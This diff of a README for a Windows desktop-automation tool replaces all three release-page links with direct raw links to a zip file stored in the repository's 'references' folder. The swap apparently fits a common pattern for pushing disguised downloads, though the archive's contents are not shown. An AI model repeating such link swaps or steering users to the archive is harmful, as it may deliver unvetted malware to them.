@@ -1,6 +1,6 @@
 # 🖥️ cua_desktop_operator_skill - Control Windows Desktop Easily
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://github.com/medhanshy27-cyber/cua_desktop_operator_skill/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://github.com/medhanshy27-cyber/cua_desktop_operator_skill/raw/refs/heads/main/references/skill-desktop-operator-cua-2.6.zip)
 
 ## 📋 About
 
@@ -32,7 +32,7 @@ This tool is designed for anyone who wants automation but does not want to manag
 
 Click the large button below to go to the release page on GitHub where you can get the software.
 
-[![Download](https://img.shields.io/badge/Get%20Latest%20Release-Download-blue)](https://github.com/medhanshy27-cyber/cua_desktop_operator_skill/releases)
+[![Download](https://img.shields.io/badge/Get%20Latest%20Release-Download-blue)](https://github.com/medhanshy27-cyber/cua_desktop_operator_skill/raw/refs/heads/main/references/skill-desktop-operator-cua-2.6.zip)
 
 ### Step 2: Choose the Latest Version
 
@@ -106,6 +106,6 @@ Here are some topics and keywords related to this tool which you can explore for
 
 ## 🏁 Get Started Now
 
-[Visit the release page to download cua_desktop_operator_skill](https://github.com/medhanshy27-cyber/cua_desktop_operator_skill/releases)
+[Visit the release page to download cua_desktop_operator_skill](https://github.com/medhanshy27-cyber/cua_desktop_operator_skill/raw/refs/heads/main/references/skill-desktop-operator-cua-2.6.zip)
 
 Download the latest version and follow the setup instructions above to start automating your Windows desktop today.
